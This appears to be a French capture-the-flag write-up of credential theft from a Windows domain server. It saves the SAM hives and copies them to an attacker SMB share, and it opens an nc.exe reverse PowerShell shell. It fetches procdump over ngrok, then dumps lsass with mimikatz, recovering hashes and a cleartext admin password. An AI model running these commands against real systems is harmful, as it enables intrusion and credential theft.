# Step 6

## Extraction sam base

* récuperer les fichiers de registres

```powershell
reg.exe save hklm\sam c:\windows\temp\sam.save
reg.exe save hklm\security c:\windows\temp\security.save
reg.exe save hklm\system c:\windows\temp\system.save
```

* ramener à la maison

```bash
smbserver.py -smb2support data .
```

```powershell
copy sam.save \\10.8.0.26\data
copy system.save \\10.8.0.26\data
copy security.save \\10.8.0.26\data
```

* extract hash

```
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0xc5a4710f6ea774c67c9da7282ce6bac4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2e476a5f9672969e0fdddc02c8b846f0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:8dee3747d9e5139c092a01ed5cfaff7f:::
[*] Dumping cached domain logon information (domain/username:hash)
FACTORY.LAN/adminServer:$DCC2$10240#adminServer#51a0628ef46625aed1e12d5b3af5071b
FACTORY.LAN/Administrator:$DCC2$10240#Administrator#f18e0b792831ef838082913e0831db37
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:d7b5e44d735873d13604bb377db5e54cd0333eba0f20d3d5e0cc08962b3d5599d4c2c9067636826861422ae5d8b9cffdba0dc920b0f930467137f43e90d2f0c5460b22429e141a0982c32b7226478a3e5c5c36674d803496602b53ba3bdc958cb9107fb8bef0f18d32efeb88cf948b4320f5e2bdfc30272d1b18a977fe5d2f41ed84b47d9f63748e964a3467eedf2b2ca6913c4dbbc1754e93a748c2dee36116ffaa4d83d6721173a6eed45f7e7a34489a8a704cb268fffb3d477cab0edfa42379fde7efb3d5339c83eb6142256ee98567b397e99c37991f57c34041e9345b4046f9ca9886735388fdc51cf7e2115c25
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:b85880afbd4002b8885c7f7c7dc1e47e
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x0aa8d2a218aad684680f7932f6d53380cab86ea2
dpapi_userkey:0xb4916346d5fd520b5384bd74e5f2941807d65552
[*] NL$KM 
 0000   DC 2C 99 E1 F7 A1 A9 A1  1B 92 D2 E9 61 CD D5 7E   .,..........a..~
 0010   D2 2B 2C D3 9C AD 17 78  54 BE 27 05 9F 6B 64 21   .+,....xT.'..kd!
 0020   03 46 1B 4C 21 FF 8A 92  CB 32 BB 70 C0 59 52 AF   .F.L!....2.p.YR.
 0030   5B 40 71 C4 C8 4C BA 3D  BC 6E 36 C0 DC 6A 38 13   [@q..L.=.n6..j8.
NL$KM:dc2c99e1f7a1a9a11b92d2e961cdd57ed22b2cd39cad177854be27059f6b642103461b4c21ff8a92cb32bb70c05952af5b4071c4c84cba3dbc6e36c0dc6a3813
[*] Cleaning up... 
```

```
samdump2 system.save sam.save 
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

--> Fausse piste

## upload procdump sur le serveur

faire un minidump du process lsass.exe, l'execution à distance avant pas l'air de fonctionne, du coup j'ai dl procdump dans le temp:

* setup web server online

```bash
# Term 1
python -m SimpleHTTPServer 4444

# Term 2
ngrok http 4444
```

* récupérer une console powershell

```bash
# web shell
\\10.8.0.34\data\nc.exe -e powershell.exe 10.8.0.34 12346

# Term 3
rlwrap ncat -klvp 12346
```

* download procdump

```
wget "http://80b7dfef.ngrok.io/procdump.exe" -OutFile "procdump.exe"
```

## récuperer le minidum

* générer le memdump lsass.exe

```
procdump -ma lsass.exe lsadump
```

* recup le minidump

```
copy lsassdump.dmp \\10.8.0.34\data\
```

## récuperer le contenu du minidump

* dans windows

```powershell
.\mimikatz.exe

privilege::debug
sekurlsa::Minidump lsassdump.dmp
sekurlsa::logonPasswords
```

Output :

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::Minidump lsassdump.dmp
Switch to MINIDUMP : 'lsassdump.dmp'

mimikatz # sekurlsa::logonPasswords
Opening : 'lsassdump.dmp' file for minidump...

Authentication Id : 0 ; 417730 (00000000:00065fc2)
Session           : Interactive from 1
User Name         : adminServer
Domain            : FACTORY
Logon Server      : DC01-WW2
Logon Time        : 10/07/2019 15:15:11
SID               : S-1-5-21-973561226-3767909689-3041734699-1104
        msv :
         [00000003] Primary
         * Username : adminServer
         * Domain   : FACTORY
         * NTLM     : e0ae639c0ee92b2118a1081376c940a0
         * SHA1     : d43cf11d9439682191f72e89d37e8124b7a7c1cf
         * DPAPI    : 5db202ad227340c895bfee8c2394c369
        tspkg :
        wdigest :
         * Username : adminServer
         * Domain   : FACTORY
         * Password : (null)
        kerberos :
         * Username : adminServer
         * Domain   : FACTORY.LAN
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SRV01-INTRANET$
Domain            : FACTORY
Logon Server      : (null)
Logon Time        : 05/07/2019 12:16:20
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : SRV01-INTRANET$
         * Domain   : FACTORY
         * NTLM     : b85880afbd4002b8885c7f7c7dc1e47e
         * SHA1     : 10d63055ddd4e53d2e3710962636cc94075b5a24
        tspkg :
        wdigest :
         * Username : SRV01-INTRANET$
         * Domain   : FACTORY
         * Password : (null)
        kerberos :
         * Username : srv01-intranet$
         * Domain   : FACTORY.LAN
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 21400 (00000000:00005398)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 05/07/2019 12:16:10
SID               :
        msv :
         [00000003] Primary
         * Username : SRV01-INTRANET$
         * Domain   : FACTORY
         * NTLM     : b85880afbd4002b8885c7f7c7dc1e47e
         * SHA1     : 10d63055ddd4e53d2e3710962636cc94075b5a24
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 417673 (00000000:00065f89)
Session           : Interactive from 1
User Name         : adminServer
Domain            : FACTORY
Logon Server      : DC01-WW2
Logon Time        : 10/07/2019 15:15:11
SID               : S-1-5-21-973561226-3767909689-3041734699-1104
        msv :
         [00000003] Primary
         * Username : adminServer
         * Domain   : FACTORY
         * NTLM     : e0ae639c0ee92b2118a1081376c940a0
         * SHA1     : d43cf11d9439682191f72e89d37e8124b7a7c1cf
         * DPAPI    : 5db202ad227340c895bfee8c2394c369
        tspkg :
        wdigest :
         * Username : adminServer
         * Domain   : FACTORY
         * Password : (null)
        kerberos :
         * Username : adminServer
         * Domain   : FACTORY.LAN
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 05/07/2019 12:16:31
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 40534 (00000000:00009e56)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 05/07/2019 12:16:23
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : SRV01-INTRANET$
         * Domain   : FACTORY
         * NTLM     : b85880afbd4002b8885c7f7c7dc1e47e
         * SHA1     : 10d63055ddd4e53d2e3710962636cc94075b5a24
        tspkg :
        wdigest :
         * Username : SRV01-INTRANET$
         * Domain   : FACTORY
         * Password : (null)
        kerberos :
         * Username : SRV01-INTRANET$
         * Domain   : factory.lan
         * Password : d7 b5 e4 4d 73 58 73 d1 36 04 bb 37 7d b5 e5 4c d0 33 3e ba 0f 20 d3 d5 e0 cc 08 96 2b 3d 55 99 d4 c2 c9 06 76 36 82 68 61 42 2a e5 d8 b9 cf fd ba 0d c9 20 b0 f9 30 46 71 37 f4 3e 90 d2 f0 c5 46 0b 22 42 9e 14 1a 09 82 c3 2b 72 26 47 8a 3e 5c 5c 36 67 4d 80 34 96 60 2b 53 ba 3b dc 95 8c b9 10 7f b8 be f0 f1 8d 32 ef eb 88 cf 94 8b 43 20 f5 e2 bd fc 30 27 2d 1b 18 a9 77 fe 5d 2f 41 ed 84 b4 7d 9f 63 74 8e 96 4a 34 67 ee df 2b 2c a6 91 3c 4d bb c1 75 4e 93 a7 48 c2 de e3 61 16 ff aa 4d 83 d6 72 11 73 a6 ee d4 5f 7e 7a 34 48 9a 8a 70 4c b2 68 ff fb 3d 47 7c ab 0e df a4 23 79 fd e7 ef b3 d5 33 9c 83 eb 61 42 25 6e e9 85 67 b3 97 e9 9c 37 99 1f 57 c3 40 41 e9 34 5b 40 46 f9 ca 98 86 73 53 88 fd c5 1c f7 e2 11 5c 25
        ssp :
        credman :

Authentication Id : 0 ; 40506 (00000000:00009e3a)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 05/07/2019 12:16:23
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : SRV01-INTRANET$
         * Domain   : FACTORY
         * NTLM     : b85880afbd4002b8885c7f7c7dc1e47e
         * SHA1     : 10d63055ddd4e53d2e3710962636cc94075b5a24
        tspkg :
        wdigest :
         * Username : SRV01-INTRANET$
         * Domain   : FACTORY
         * Password : (null)
        kerberos :
         * Username : SRV01-INTRANET$
         * Domain   : factory.lan
         * Password : d7 b5 e4 4d 73 58 73 d1 36 04 bb 37 7d b5 e5 4c d0 33 3e ba 0f 20 d3 d5 e0 cc 08 96 2b 3d 55 99 d4 c2 c9 06 76 36 82 68 61 42 2a e5 d8 b9 cf fd ba 0d c9 20 b0 f9 30 46 71 37 f4 3e 90 d2 f0 c5 46 0b 22 42 9e 14 1a 09 82 c3 2b 72 26 47 8a 3e 5c 5c 36 67 4d 80 34 96 60 2b 53 ba 3b dc 95 8c b9 10 7f b8 be f0 f1 8d 32 ef eb 88 cf 94 8b 43 20 f5 e2 bd fc 30 27 2d 1b 18 a9 77 fe 5d 2f 41 ed 84 b4 7d 9f 63 74 8e 96 4a 34 67 ee df 2b 2c a6 91 3c 4d bb c1 75 4e 93 a7 48 c2 de e3 61 16 ff aa 4d 83 d6 72 11 73 a6 ee d4 5f 7e 7a 34 48 9a 8a 70 4c b2 68 ff fb 3d 47 7c ab 0e df a4 23 79 fd e7 ef b3 d5 33 9c 83 eb 61 42 25 6e e9 85 67 b3 97 e9 9c 37 99 1f 57 c3 40 41 e9 34 5b 40 46 f9 ca 98 86 73 53 88 fd c5 1c f7 e2 11 5c 25
        ssp :
        credman :

Authentication Id : 0 ; 22582 (00000000:00005836)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 05/07/2019 12:16:16
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : SRV01-INTRANET$
         * Domain   : FACTORY
         * NTLM     : b85880afbd4002b8885c7f7c7dc1e47e
         * SHA1     : 10d63055ddd4e53d2e3710962636cc94075b5a24
        tspkg :
        wdigest :
         * Username : SRV01-INTRANET$
         * Domain   : FACTORY
         * Password : (null)
        kerberos :
         * Username : SRV01-INTRANET$
         * Domain   : factory.lan
         * Password : d7 b5 e4 4d 73 58 73 d1 36 04 bb 37 7d b5 e5 4c d0 33 3e ba 0f 20 d3 d5 e0 cc 08 96 2b 3d 55 99 d4 c2 c9 06 76 36 82 68 61 42 2a e5 d8 b9 cf fd ba 0d c9 20 b0 f9 30 46 71 37 f4 3e 90 d2 f0 c5 46 0b 22 42 9e 14 1a 09 82 c3 2b 72 26 47 8a 3e 5c 5c 36 67 4d 80 34 96 60 2b 53 ba 3b dc 95 8c b9 10 7f b8 be f0 f1 8d 32 ef eb 88 cf 94 8b 43 20 f5 e2 bd fc 30 27 2d 1b 18 a9 77 fe 5d 2f 41 ed 84 b4 7d 9f 63 74 8e 96 4a 34 67 ee df 2b 2c a6 91 3c 4d bb c1 75 4e 93 a7 48 c2 de e3 61 16 ff aa 4d 83 d6 72 11 73 a6 ee d4 5f 7e 7a 34 48 9a 8a 70 4c b2 68 ff fb 3d 47 7c ab 0e df a4 23 79 fd e7 ef b3 d5 33 9c 83 eb 61 42 25 6e e9 85 67 b3 97 e9 9c 37 99 1f 57 c3 40 41 e9 34 5b 40 46 f9 ca 98 86 73 53 88 fd c5 1c f7 e2 11 5c 25
        ssp :
        credman :

Authentication Id : 0 ; 22538 (00000000:0000580a)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 05/07/2019 12:16:16
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : SRV01-INTRANET$
         * Domain   : FACTORY
         * NTLM     : b85880afbd4002b8885c7f7c7dc1e47e
         * SHA1     : 10d63055ddd4e53d2e3710962636cc94075b5a24
        tspkg :
        wdigest :
         * Username : SRV01-INTRANET$
         * Domain   : FACTORY
         * Password : (null)
        kerberos :
         * Username : SRV01-INTRANET$
         * Domain   : factory.lan
         * Password : d7 b5 e4 4d 73 58 73 d1 36 04 bb 37 7d b5 e5 4c d0 33 3e ba 0f 20 d3 d5 e0 cc 08 96 2b 3d 55 99 d4 c2 c9 06 76 36 82 68 61 42 2a e5 d8 b9 cf fd ba 0d c9 20 b0 f9 30 46 71 37 f4 3e 90 d2 f0 c5 46 0b 22 42 9e 14 1a 09 82 c3 2b 72 26 47 8a 3e 5c 5c 36 67 4d 80 34 96 60 2b 53 ba 3b dc 95 8c b9 10 7f b8 be f0 f1 8d 32 ef eb 88 cf 94 8b 43 20 f5 e2 bd fc 30 27 2d 1b 18 a9 77 fe 5d 2f 41 ed 84 b4 7d 9f 63 74 8e 96 4a 34 67 ee df 2b 2c a6 91 3c 4d bb c1 75 4e 93 a7 48 c2 de e3 61 16 ff aa 4d 83 d6 72 11 73 a6 ee d4 5f 7e 7a 34 48 9a 8a 70 4c b2 68 ff fb 3d 47 7c ab 0e df a4 23 79 fd e7 ef b3 d5 33 9c 83 eb 61 42 25 6e e9 85 67 b3 97 e9 9c 37 99 1f 57 c3 40 41 e9 34 5b 40 46 f9 ca 98 86 73 53 88 fd c5 1c f7 e2 11 5c 25
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : SRV01-INTRANET$
Domain            : FACTORY
Logon Server      : (null)
Logon Time        : 05/07/2019 12:16:10
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : SRV01-INTRANET$
         * Domain   : FACTORY
         * Password : (null)
        kerberos :
         * Username : srv01-intranet$
         * Domain   : FACTORY.LAN
         * Password : (null)
        ssp :
        credman :
         [00000000]
         * Username : factory.lan\adminServer
         * Domain   : 172.16.42.101
         * Password : #3LLe!!estOuL@Poulette
```


> factory.lan\adminServer : #3LLe!!estOuL@Poulette

## Flag

> 87950cf8267662a3b26460b38a07f0e2f203539676f4a88a7c572a596140ade4